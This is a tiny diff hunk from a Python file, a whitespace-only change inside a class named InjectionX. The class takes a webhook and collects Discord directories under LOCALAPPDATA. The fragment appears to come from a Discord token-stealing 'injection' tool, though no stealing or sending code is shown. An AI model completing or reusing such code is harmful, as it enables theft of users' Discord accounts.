@@ -7,7 +7,7 @@ from base64 import b64decode
 
 class InjectionX:
     def __init__(self, webhook: str) -> None:
-        
+
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
             self.appdata + '\\Discord',
